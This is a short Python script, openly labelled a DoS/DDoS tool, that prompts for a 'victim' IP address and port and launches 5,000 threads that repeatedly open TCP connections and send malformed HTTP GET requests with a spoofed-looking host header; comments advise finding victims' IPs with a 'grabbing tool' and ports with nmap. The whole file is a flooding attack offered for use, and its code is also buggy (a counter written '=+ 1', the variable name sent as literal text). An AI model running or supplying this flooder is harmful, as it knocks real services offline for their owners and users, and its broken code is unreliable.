from pip._vendor.distlib.compat import raw_input
import socket
import threading
import pyfiglet

#raw_input fuction to accept user input.
#socket for (host,port fuction).
#threading is to run multiple task, basically core of the dos system.
#pyfiglet is for ascii art renders.

result = pyfiglet.figlet_format("DDOS/DOS", font="5lineoblique")
print(result)

target = raw_input("IP ADDRESS OF VICTIM" r""">>>>------> """)
port = int(input("PORT NUMBER" r""">>>>-------> """))

print("ip note = 182.21.20.32 is botnet for DDoS")
print("ip note = 192.168.1.2 Ethernet testing")
print("ip note = 192.168.1.14 Local DoSing")

fake_ip = raw_input("Fake IP" r""">>>--------> """)

#ip note = 182.21.20.32 is botnet
#ip note = 192.168.1.2 Ethernet testing
#ip note = 192.168.1.14 Local DoS-ing

#use known ip addresses use grabbing tool to obtain it
#get port using nmap



already_connected = 0


def attack():
    while True:
        s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected =+ 1
        if already_connected %500 == 0:
            print(already_connected)


for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()

#created By eiji-codename Sakura